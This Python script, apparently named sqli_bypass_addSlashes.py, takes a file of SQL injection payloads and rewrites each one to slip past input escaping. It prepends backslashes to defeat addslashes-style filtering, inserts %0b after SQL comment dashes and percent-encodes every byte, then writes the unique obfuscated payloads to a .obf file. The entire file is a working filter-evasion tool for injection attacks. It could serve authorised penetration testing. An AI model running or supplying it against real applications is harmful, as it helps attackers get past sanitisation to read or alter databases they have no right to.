#!/usr/bin/env python3

import sys
import re
from pathlib import Path
import urllib.parse

# matches -- not followed by %0b or %0B
_RE_DASHDASH = re.compile(r'--(?!%0[bB])')

def prepend_double_backslash(s: str) -> str:
    # always prepend two backslashes (literal backslashes)
    return '\\\\' + s

def add_percent0b_after_dashdash(s: str) -> str:
    return _RE_DASHDASH.sub('--%0b', s)

def urldecode_then_percent_encode_all(s: str) -> str:
    decoded = urllib.parse.unquote(s)
    b = decoded.encode('utf-8')
    return ''.join('%{:02X}'.format(byte) for byte in b)

def transform_line(line: str) -> str:
    s = prepend_double_backslash(line)
    s = add_percent0b_after_dashdash(s)
    s = urldecode_then_percent_encode_all(s)
    return s

def main():
    if len(sys.argv) != 2:
        print("Usage: python sqli_bypass_addSlashes.py input_payloads.txt", file=sys.stderr)
        sys.exit(2)

    in_path = Path(sys.argv[1])
    if not in_path.is_file():
        print(f"Input file not found: {in_path}", file=sys.stderr)
        sys.exit(1)

    out_path = in_path.with_name(in_path.name + ".obf")

    seen = set()
    out_lines = []
    total_in = 0

    with in_path.open("r", encoding="utf-8", errors="ignore") as f:
        for raw in f:
            total_in += 1
            raw = raw.rstrip("\n\r")
            if not raw:
                continue
            obf = transform_line(raw)
            if obf in seen:
                continue
            seen.add(obf)
            out_lines.append(obf)

    with out_path.open("w", encoding="utf-8") as fo:
        for ln in out_lines:
            fo.write(ln + "\n")

    print(f"Done. Processed {total_in} input lines. Output written: {out_path} ({len(out_lines)} unique payloads).")

if __name__ == "__main__":
    main()
